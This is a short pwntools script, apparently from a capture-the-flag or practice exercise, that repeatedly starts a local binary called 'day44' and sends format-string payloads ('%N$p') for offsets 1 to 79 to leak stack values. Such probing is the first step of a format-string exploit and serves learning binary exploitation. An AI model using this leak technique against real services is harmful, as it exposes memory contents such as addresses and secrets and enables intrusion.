from pwn import *

context.binary = "./day44"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day44")
	p.recvuntil(b"name: ")
	payload = f"%{i}$p".encode()
	p.sendline(payload)
	out = p.recvline()

	
	print(i, out)
	p.close()
